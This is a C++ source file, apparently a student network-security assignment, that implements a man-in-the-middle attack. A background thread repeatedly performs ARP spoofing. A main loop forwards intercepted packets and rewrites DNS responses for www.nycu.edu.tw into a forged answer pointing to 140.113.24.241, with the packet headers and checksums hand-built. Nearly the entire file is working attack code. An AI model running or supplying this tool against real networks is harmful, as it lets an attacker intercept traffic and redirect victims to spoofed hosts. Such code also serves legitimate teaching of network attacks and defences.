#include "Net.h"
#include <cstdlib>
#include <pthread.h>
#include <unistd.h>
#include <netdb.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

using namespace std;

void* arp_spoofing(void*);
Net* net;

void extract_dns_query(char *query, char*extracted_query){

    int size = query[0];
    int k = 0, j = 1;
    while(size > 0){
        for(int i=0;i<size;++i){
            extracted_query[k++] = query[j++];
        }
        extracted_query[k++] = '.';
        size = query[j++];
    }

    extracted_query[k-1] = '\0';
}

unsigned short csum(iphdr ip_hdr){
    unsigned short *buf = (unsigned short *)&ip_hdr;
    unsigned long sum = 0;
    for(int i=0; i<sizeof(iphdr)/2; i++){
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

int dns_spoofing(char* buf, int len){
    char answer[ANSWER_SIZE] = {0};
    dns_hdr_t* dns_hdr = (dns_hdr_t*)buf;
    char* dns_data = (char*)dns_hdr + sizeof(dns_hdr_t);
    char extracted_query[BUF_SIZE] = {0};
    extract_dns_query(dns_data, extracted_query);

    if(strcmp(extracted_query, "www.nycu.edu.tw") != 0){
        return len;
    }
    else{

        //dns_hdr
        memcpy(&answer[0], &dns_hdr->id, 2);
        memcpy(&answer[2], "\x81\x80", 2);
        memcpy(&answer[4], "\x00\x01", 2);
        memcpy(&answer[6], "\x00\x01", 2);
        memcpy(&answer[8], "\x00\x00", 2);
        memcpy(&answer[10], "\x00\x00", 2);

        // dns query
        int size = strlen(extracted_query)+2; 
        memcpy(&answer[12], dns_data, size); 
        size+=12;
        memcpy(&answer[size], "\x00\x01", 2); 
        size+=2;
        memcpy(&answer[size], "\x00\x01", 2); 
        size+=2;
        
        // dns answer
        memcpy(&answer[size], "\xc0\x0c", 2); 
        size+=2;
        memcpy(&answer[size], "\x00\x01", 2); 
        size+=2;
        memcpy(&answer[size], "\x00\x01", 2); 
        size+=2;
        memcpy(&answer[size], "\x00\x00\x00\x20", 4); 
        size+=4;
        memcpy(&answer[size], "\x00\x04", 2); 
        size+=2; 
        memcpy(&answer[size], "\x8c\x71\x18\xf1", 4); // 140.113.24.241 
        size+=4; 


        dns_hdr->udp_hdr.check = 0;
        dns_hdr->udp_hdr.len = htons(size + sizeof(udphdr));
        dns_hdr->ip_hdr.tot_len = htons(size + sizeof(iphdr) + sizeof(udphdr));
        dns_hdr->ip_hdr.check = 0;
        dns_hdr->ip_hdr.check = csum(dns_hdr->ip_hdr);

        int hdr_size = sizeof(ether_header) + sizeof(iphdr) + sizeof(udphdr);
        memset(buf+hdr_size, 0, len-hdr_size);
        memcpy(buf+hdr_size, answer, size);
        return size+hdr_size;
    }
}

int main(int argc, char** argv){
    net = new Net((argc < 2) ? "" : argv[1]);
    net->get_net_mac();
    net->print_net_mac();
    net->arp_spoofing();

    pthread_t thread;
    pthread_create(&thread, NULL, arp_spoofing, NULL); // Create a new thread to do ARP spoofing periodically

    while (true) {
        tcp_packet buf;
        memset(&buf, 0, sizeof(buf));
        int len = recvfrom(net->get_forward_sock(), &buf, ETH_FRAME_LEN, 0, NULL, NULL);
        if (len > 0 ) {
            if (buf.ip_hdr.protocol == IPPROTO_UDP && ntohs(buf.tcp_hdr.source) == 53) {
                len = dns_spoofing((char*)&buf, len);
            }
            net->forward_ipv4(&buf, len); 
        }
    }

    pthread_cancel(thread);
    delete(net);

    return 0;
}

void* arp_spoofing(void* args) {
    while (true) {
        usleep(ARP_SPOOFING_PERIOD);
        // net->get_net_mac(); // It cannot add ARP table entries from user space, so it has to detect whether there are new devices before do ARP spoofing
        net->arp_spoofing();
    }
    return NULL;
}